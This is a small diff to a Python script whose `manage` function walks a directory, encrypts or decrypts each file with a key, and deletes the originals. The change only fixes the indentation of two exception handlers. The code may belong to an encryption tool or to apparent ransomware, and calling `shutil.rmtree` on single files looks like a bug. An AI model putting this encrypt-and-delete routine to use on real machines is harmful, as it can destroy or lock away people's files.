@@ -97,14 +97,14 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                     try: 
                         if not ".enc" in filename:
                             shutil.rmtree(filename)
-                        except OSError:
+                    except OSError:
                             print("cant delete :(")
                 elif function == 1:
                     decrypt_file(key, filename, None, 64*1024)
                     try: 
                         if ".enc" in filename:
                             shutil.rmtree(filename)
-                        except OSError:
+                    except OSError:
                             print("cant delete :(")
                     
             except IOError:
